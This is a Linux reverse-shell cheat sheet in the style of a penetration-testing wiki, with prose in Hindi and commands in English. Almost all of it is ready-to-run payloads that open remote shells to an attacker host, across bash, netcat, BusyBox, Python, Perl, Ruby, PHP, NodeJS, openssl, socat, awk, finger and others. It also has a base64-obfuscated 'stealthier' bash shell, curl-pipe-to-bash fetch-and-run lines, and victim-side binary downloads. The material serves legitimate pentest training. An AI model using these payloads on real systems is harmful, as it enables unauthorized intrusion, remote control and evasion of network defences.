# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**यदि आपके पास इनमें से किसी भी shell के बारे में प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com) **पर चेक कर सकते हैं**

## Full TTY

**एक बार जब आपको reverse shell मिल जाए**[ **पूर्ण TTY प्राप्त करने के लिए यह पेज पढ़ें**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
श sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, और bash के साथ भी check करना न भूलें।

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell explanation

1. **`bash -i`**: यह कमांड का यह हिस्सा एक interactive (`-i`) Bash shell शुरू करता है।
2. **`>&`**: यह कमांड का यह हिस्सा **standard output** (`stdout`) और **standard error** (`stderr`) दोनों को **same destination** पर **redirect** करने के लिए एक shorthand notation है।
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक special file है जो **specified IP address और port के लिए एक TCP connection को represent करती है**।
- **output और error streams को इस file पर redirect करके**, यह command effectively interactive shell session का output attacker की machine पर भेज देती है।
4. **`0>&1`**: यह part **standard input (`stdin`) को standard output (`stdout`) के same destination पर redirect** करता है।

### Create in file and execute
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

जब आप Linux-आधारित web application में **Remote Code Execution (RCE)** vulnerability से निपट रहे होते हैं, तो reverse shell हासिल करना iptables rules या जटिल packet filtering mechanisms जैसी network defenses की वजह से बाधित हो सकता है। ऐसे सीमित environments में, एक वैकल्पिक तरीका PTY (Pseudo Terminal) shell स्थापित करना है ताकि compromised system के साथ अधिक प्रभावी ढंग से interact किया जा सके।

इस उद्देश्य के लिए एक recommended tool है [toboggan](https://github.com/n3rada/toboggan.git), जो target environment के साथ interaction को सरल बनाता है।

toboggan का प्रभावी उपयोग करने के लिए, अपने target system के RCE context के अनुसार एक Python module बनाएं। उदाहरण के लिए, `nix.py` नाम का module इस प्रकार structured हो सकता है:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
और फिर, आप चला सकते हैं:
```shell
toboggan -m nix.py -i
```
एक interractive shell को सीधे leverage करने के लिए। आप Burpsuite integration के लिए `-b` जोड़ सकते हैं और एक ज़्यादा basic rce wrapper के लिए `-i` हटा सकते हैं।

एक और possibility `IppSec` forward shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) का उपयोग करना है।

आपको बस यह modify करना है:

- vulnerable host का URL
- आपके payload का prefix और suffix (अगर कोई हो)
- payload भेजने का तरीका (headers? data? extra info?)

फिर, आप बस **commands भेज** सकते हैं या पूरा PTY पाने के लिए **`upgrade` command का उपयोग** कर सकते हैं (ध्यान दें कि pipes लगभग 1.3s delay के साथ read और written होते हैं)।

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

**routers**, **embedded devices**, **containers**, और stripped-down Linux appliances में बहुत common. अगर standalone `nc` नहीं है, तो check करें कि क्या BusyBox इसे expose करता है:
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
यदि `busybox nc` मौजूद है लेकिन interactive execution flaky है, तो `nc` section का FIFO pattern आमतौर पर फिर भी काम करता है:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

इसे [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) में देखें
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## टेलनेट
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**हमलावर**
```bash
while true; do nc -l <port>; done
```
कमांड भेजने के लिए उसे लिखें, Enter दबाएँ और CTRL+D दबाएँ (STDIN रोकने के लिए)

**Victim**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## रूबी
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (built-in TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust में लिखा गया modern netcat-like listener (2024 से Kali में packaged).
```bash
# Attacker – interactive TLS listener with history & tab-completion
rcat listen -ib 55600

# Victim – download static binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
विशेषताएँ:
- एन्क्रिप्टेड ट्रांसपोर्ट (TLS 1.3) के लिए वैकल्पिक `--ssl` flag
- victim पर कोई भी binary (जैसे `/bin/sh`, `python3`) spawn करने के लिए `-s`
- पूरी तरह interactive PTY में automatically upgrade करने के लिए `--up`

## pwncat-cs

अगर आपके पास पहले से **कोई raw reverse shell** है लेकिन आप ऐसा listener चाहते हैं जो automatically उसे एक अधिक usable session में upgrade करने की कोशिश करे, तो `pwncat-cs` एक plain `nc -lvnp` listener का अच्छा modern replacement है।
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
यह **encrypted** `ssl-bind` और `ssl-connect` channels को भी support करता है, इसलिए जब आपको transport encryption की ज़रूरत हो, तब आप इसे `ncat --ssl` या `socat OPENSSL:` payloads के साथ pair कर सकते हैं।

## revsh (encrypted & pivot-ready)

`revsh` एक छोटा C client/server है जो **encrypted Diffie-Hellman tunnel** के जरिए full TTY देता है और optional रूप से reverse VPN-like pivoting के लिए एक **TUN/TAP** interface attach कर सकता है।
```bash
# Build (or grab a pre-compiled binary from the releases page)
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443 with a pinned certificate
revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem

# Victim – reverse shell over TLS to the attacker
./revsh <ATTACKER-IP>:443
```
उपयोगी flags:
- `-b` : reverse के बजाय bind-shell
- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS के through proxy
- `-t` : एक TUN interface बनाएं (reverse VPN)

क्योंकि पूरी session encrypted और multiplexed होती है, यह अक्सर simple egress filtering को bypass कर देती है, जो plain-text `/dev/tcp` shell को kill कर देता।

## OpenSSL

एक **single-port encrypted reverse shell** आमतौर पर classic two-listener pattern से ज्यादा practical होता है क्योंकि इसे `443` के through proxy करना आसान होता है और automate करना भी simpler होता है।

The Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
पीड़ित
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
जब आप अलग-अलग input/output channels चाहते हैं, तब भी आप classic **two-listener** pattern का उपयोग कर सकते हैं:
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### बाइंड शेल
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### रिवर्स शेल
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## फिंगर

**अटैकर**
```bash
while true; do nc -l 79; done
```
कमांड भेजने के लिए उसे लिखें, Enter दबाएँ और CTRL+D दबाएँ (STDIN रोकने के लिए)

**Victim**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

यह आपके सिस्टम से port 6001 पर connect करने की कोशिश करेगा:
```bash
xterm -display 10.0.0.1:1
```
रिवर्स शेल को पकड़ने के लिए आप उपयोग कर सकते हैं (जो port 6001 में listen करेगा):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

द्वारा [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell भी Groovy के लिए काम करता है
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)

{{#include ../../banners/hacktricks-training.md}}
